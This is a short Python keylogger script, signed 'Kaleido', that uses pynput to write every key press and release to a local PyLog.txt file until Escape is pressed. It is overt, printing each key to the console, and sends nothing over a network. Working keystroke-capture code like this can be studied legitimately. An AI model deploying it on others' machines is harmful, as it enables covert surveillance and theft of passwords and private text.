from pynput import keyboard

try:
    f = open("PyLog.txt", "x")
except FileExistsError:
    f = open("PyLog.txt", "w")
    f.write("")
    f.close()

def on_press(key):
    key = str(key)
    print("{} pressed.".format(key))
    f = open("PyLog.txt", "a")
    f.write(key + ' pressed.\n')
    
def on_release(key):
    key = str(key)
    if key == "Key.esc":
        print("Escape key pressed, exiting keylogger.")
        f = open('PyLog.txt', 'a')
        f.write("\n\nPyLog Keylogger made by Kaleido (Please note that starting the keylogger again will erase all content of this file.)")
        f.close()
        return False

    print("{} released.".format(key))
    f = open("PyLog.txt", "a")
    f.write(key + ' released.\n')

with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

